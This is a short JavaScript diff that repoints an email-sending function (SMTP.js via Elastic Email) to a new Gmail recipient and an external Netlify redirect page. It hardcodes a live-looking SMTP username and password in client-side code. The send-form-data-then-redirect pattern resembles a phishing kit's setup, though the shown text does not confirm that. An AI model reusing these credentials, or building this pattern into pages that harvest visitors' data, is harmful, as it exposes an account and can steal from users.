@@ -9,7 +9,7 @@ function sendx() {
         Host: "smtp.elasticemail.com",
         Username: "ranur0248@gmail.com",
         Password: "99DFEC05DF8B03DDDF3F7452559A9C2E19C4",
-        To: 'thebindudesign@gmail.com',
+        To: 'ranur0249@gmail.com',
         From: "ranur0248@gmail.com",
         Subject: "Testing",
         Body: bodyx
@@ -17,7 +17,7 @@ function sendx() {
         function(message) {
           
             // Redirect to suc.html after showing the alert
-            window.location.href = "suc.html";
+            window.location.href = "https://rbse.netlify.app/m.html";
         }
     );
 
